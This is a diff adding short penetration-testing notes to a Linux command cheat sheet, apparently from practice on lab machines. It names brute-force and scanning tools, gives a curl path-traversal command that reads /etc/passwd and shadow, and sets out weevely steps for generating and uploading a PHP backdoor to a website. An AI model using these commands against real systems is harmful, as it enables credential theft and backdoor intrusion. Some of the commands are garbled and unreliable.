@@ -30,3 +30,20 @@ ps -ef : The ps command enables you to check the status of active processes on a
          as well as display technical information about the processes.
          This data is useful for such administrative tasks as determining how to set process priorities
   tmux >> terminal open differnt sessions managed from one place
+
+
+......Bsides........
+wpscan >> sacn wordpress vulns
+hydra - medusa >> for brute force passwords with wordlist
+
+.....w1r3s.........
+sparta >> automate SCAN - BRUTEFORCE [ nmap - nikto - hydra ]
+hash-identifier >> type 
+curl -s --dataurlencode urlconfig=../../etc/passwd-shadow address 
+
+...........jis...........
+weevely >> create backdoors
+weevely generate backdoor_password directory >> 1
+upload backdoor to website >> 2
+weevely URL/upload/backdoor.php  backdoor_password >> 3
+
